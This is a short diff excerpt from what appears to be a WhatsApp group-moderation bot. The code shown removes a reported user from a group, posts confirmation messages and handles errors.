+            await AlexaInc.groupParticipantsUpdate(
+              ongrp,
+              [reportingfor],
+              "remove",
+            ).then(console.log);
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "✅ User will remove!.",
+            });
+            await AlexaInc.sendMessage(ongrp, {
+              text: `✅ User ${reportingfor} will remove!. because he/she put dm without permission`,
+            });
+          } else {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: result.reason || result.error,
+            });
+          }
+          userreportingstate[msg.key.remoteJid] = {};
+        } catch (e) {
+          console.error("Main App Error:", e);
+        }
+      }
     }
+  } catch (e) {
+    console.error("❌ Critical Error in handleMessage:", e);
+  }
 }
 
 module.exports = {
-    handleMessage
+  handleMessage,
 };
